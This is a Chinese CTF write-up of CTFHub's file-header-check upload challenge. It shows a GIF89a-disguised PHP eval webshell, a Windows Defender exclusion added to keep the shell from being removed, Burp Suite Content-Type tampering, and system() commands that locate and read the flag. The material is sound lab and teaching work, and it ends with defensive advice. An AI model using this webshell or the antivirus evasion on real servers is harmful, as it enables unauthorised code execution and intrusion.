【CTFHub】Web-文件头检查 Writeup

操作者：何芊宏 | 操作日期：2026.9.18 | 分类：CTF | 标签：CTFHub, Web, 文件上传, 文件头检查, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / 文件头检查
  • 题目名称：文件头检查
  • 提示：服务器检测文件开头（魔数），利用图片文件头伪装 PHP 代码

2. 解题思路

本题目的是利用服务器“仅校验文件开头字段（魔数/Magic Bytes），不校验文件后缀和内容”的缺陷。通过魔法字节 GIF89a 伪造文件头绕过检测，配合 Burp Suite 抓包修改 MIME 类型绕过上传点，并利用 POST 请求执行系统命令。期间经历了 HTTP 协议格式错误、文件内容被净化、脚本后缀解析失败等多个实战陷阱。

3. 操作步骤

第一步：本地环境构建与杀软拦截（试错1）

在 VS Code 中新建 shell.php，写入 GIF89a 和 <?php @eval($_POST['cmd']); ?>。

  • 试错与结果：保存文件时，Windows Defender 立即弹窗报毒并拦截，导致文件无法在桌面存储超过 30 秒，甚至在上传时提示“文件包含病毒或潜在的垃圾软件，无法成功完成操作”。
  • 解决办法：在 Windows 安全中心添加了排除项 C:\Users\heqianhong\Desktop\muma 文件夹，并将文件移至该目录下，绕过 Defender 监控。

第二步：前端与后端文件类型拦截（试错2）

直接上传 shell.php 时，网页弹出“文件类型不正确，只允许上传 jpeg jpg png gif 类型的文件”。

  • 试错与结果：服务器强制限制了后缀/类型，必须抓包修改。

第三步：Burp 抓包与修改 Content-Type（试错3）

开启 Burp 拦截，在自带浏览器中上传 shell.php。

  • 操作：拦截后，保留 filename="shell.php"，将 Content-Type: application/x-php 修改为 Content-Type: image/jpeg，放行后提示“上传成功”，路径为 upload/shell.php。

第四步：Repeater 连马与 400 Bad Request 泥潭（试错4、5、6）

进入 Repeater 尝试执行命令时，经历了新手最痛苦的“HTTP 协议报错地狱”：

  • 错误1（GET/POST混淆）：误将 ?cmd=system("ls /"); 拼接到 URL 里直接访问，发的是 GET 请求。而木马只接收 $_POST['cmd']。结果页面空白或只返回 GIF89a，命令未执行。
  • 错误2（Content-Length 不匹配）：手动改造请求体时，忘了 Content-Length 的长度必须和实际请求体一致。BP 自动计算 631 或手动改为 0 时，服务器直接返回 400 Bad Request。
  • 错误3（格式混乱）：请求头与请求体之间没有正确保留空行，且删除了旧的 multipart/form-data 内容后，残留了边界符（如 ----WebKitFormBoundary...）。
  • 解决办法：第一行改为 POST /upload/shell.php HTTP/1.1；保留一个空行；请求体只写 cmd=system("ls /");；手动将 Content-Length 精确改为 19。

第五步：后缀解析与文件净化拉锯战（试错7）

  • 试错1（将 shell.php 改后缀为 shell.jpg）：成功上传后访问 URL，服务器把它当成静态图片，页面一片空白（或渲染失败），PHP 无法执行。
  • 试错2（尝试访问 shell.phtml）：由于服务器用的是 openresty（默认只解析 .php），访问 .phtml 时，右侧响应直接打印了源码 GIF89a 和 <?php... ?>，说明未被解析。
  • 试错3（使用 Content-Type: image/jpeg 上传）：利用 GIF89a 配合 image/jpeg 成功上传，但在访问时，服务器发现内容是“图片”，调用了图片处理库进行“二次渲染”（净化），把后面的 PHP 代码全删了，只留下了 8 个字节的 GIF89a。
  • 解决办法（关键）：保持 filename="shell.php"，但将 Content-Type 改为 image/gif（或者删掉这一行）。这样既绕过了文件类型校验，又避免了二次渲染，PHP 代码被完整保存。

第六步：全盘搜索并读取 Flag（试错8）

  • 操作1：在 Repeater 中执行 cmd=system("ls /");（长度19），成功回显根目录，但没看到 flag。
  • 操作2：执行 cmd=system("ls -la /");（长度23），查看隐藏文件，依然没找到。
  • 操作3（试错）：执行 cmd=system("find / -name flag*2>/dev/null");（长度44），回显为空。
  • 错误原因：flag* 和 2> 之间少了一个空格！导致 find 命令去寻找了名为 flag*2 的文件。
  • 修正（成功）：加上空格，命令改为 cmd=system("find / -name flag* 2>/dev/null");（长度45），成功搜索到路径 /var/www/html/flag_493430573.php。
  • 读取 Flag：执行 cmd=system("cat /var/www/html/flag_493430573.php");（长度51），成功回显 Flag：ctfhub{412034173c2a328463952959}。

4. 踩坑记录与复盘

  • Windows Defender 与本地木马（文件隔离）：本地创建木马时，安全软件会直接拦截。最佳实践是添加白名单文件夹，而不是关闭杀软，防止本地环境遭殃。
  • HTTP 协议严谨性（Content-Length 与空行）：POST 请求中，Header 与 Body 之间必须有一个空行；Content-Length 必须与请求体的精确字节数一致。改包后最好使用 BP 的 Pretty 视图添加参数，让工具自动计算长度，避免手动修改出错。
  • 文件后缀与解析机制：上传的文件名保持 .php 至关重要。如果改成 .jpg 只能作为静态资源读取；如果服务器（如 openresty）不支持 .phtml 等后缀，就无法解析代码。
  • 图片二次渲染（净化）陷阱：千万不要盲目修改 Content-Type 为 image/jpeg。这会导致服务端调用图像处理引擎对图片进行重绘，从而彻底清除隐藏在其中的 PHP 代码。对于 GIF89a 伪造，配合 image/gif 或干脆不写类型反而更安全。
  • 命令细节决定成败：Linux 命令对空格和特殊符号极其敏感。find / -name flag* 2>/dev/null 中缺一不可，这需要我们在实操中养成严谨的习惯。

5. 知识总结

  • 文件头（Magic Bytes）绕过：利用 GIF89a 等图片魔数欺骗服务器的 getimagesize() 或文件头检测函数。
  • MIME 类型绕过：在 Burp Suite 中修改 Content-Type（如改为 image/gif），以此绕过前端或后端对类型的严格校验。
  • WebShell 命令执行与高级搜索：利用 system() 函数执行 Linux 命令，利用 find / -name flag* 2>/dev/null 实现全盘静默搜索，利用 cat 读取文件内容。
  • 安全防御建议：防御文件上传漏洞应进行多重校验（白名单后缀 + MIME 类型校验 + 文件内容二次渲染 + 上传目录不可执行权限），彻底杜绝各类文件头伪造和解析漏洞。
